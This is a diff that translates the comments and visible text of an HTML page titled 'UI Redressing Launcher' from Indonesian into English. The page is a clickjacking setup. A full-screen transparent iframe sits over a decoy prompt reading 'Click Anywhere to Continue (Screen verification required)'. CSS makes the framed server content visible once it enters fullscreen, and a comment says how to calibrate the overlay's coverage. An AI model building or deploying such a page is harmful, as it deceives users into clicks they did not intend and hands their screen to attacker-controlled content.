@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UI Redressing Launcher - Click Anywhere</title>
     <style>
-        /* 1. Paksa body mengisi seluruh layar tanpa scrollbar */
+        /* 1. Force the body to occupy the entire viewport without scrollbars */
         body, html {
             margin: 0;
             padding: 0;
@@ -15,7 +15,7 @@
             font-family: Arial, sans-serif;
         }
 
-        /* 2. PERUBAHAN UTAMA: Kontainer jebakan memenuhi seluruh layar */
+        /* 2. Main container expands to full screen execution size */
         .container {
             position: relative;
             width: 100vw;
@@ -23,7 +23,7 @@
             background: #f0f0f0;
         }
 
-        /* Umpan visual agar pengguna merasa perlu mengklik halaman */
+        /* Visual decoy background underneath the transparent iframe */
         .decoy-background {
             position: absolute;
             width: 100%;
@@ -46,7 +46,7 @@
             text-align: center;
         }
         
-        /* 3. Iframe transparan yang menutupi seluruh layar sejak awal */
+        /* 3. Transparent iframe covering the whole screen from the start */
         .overlay-frame {
             position: absolute;
             top: 0;
@@ -55,18 +55,18 @@
             height: 100vh !important;
             border: none;
             z-index: 2;
-            opacity: 0.0; /* Ubah ke 0.3 untuk kalibrasi/melihat area cakupan hijau iframe */
+            opacity: 0.0; /* Change to 0.3 during testing to see the frame boundary */
         }
 
-        /* Ketika iframe masuk ke Top Layer via requestFullscreen */
+        /* Triggered when the iframe enters Top Layer via requestFullscreen */
         .overlay-frame:fullscreen {
             width: 100vw !important;
             height: 100vh !important;
-            opacity: 1.0 !important; /* Buat isi server langsung terlihat penuh */
+            opacity: 1.0 !important; /* Forces the server content to become visible */
             background-color: #ffffff !important;
         }
         
-        /* Dukungan WebKit engine (Safari / iOS WebView) */
+        /* WebKit engine support (Safari / iOS WebView) */
         .overlay-frame:-webkit-full-screen {
             width: 100vw !important;
             height: 100vh !important;
@@ -80,9 +80,9 @@
 <div class="container">
     <div class="decoy-background">
         <div class="decoy-text">
-            Ketuk Di Mana Saja untuk Melanjutkan
+            Click Anywhere to Continue
             <div style="font-size: 12px; font-weight: normal; margin-top: 5px; color: #e8f0fe;">
-                (Membutuhkan otentikasi layar)
+                (Screen verification required)
             </div>
         </div>
     </div>
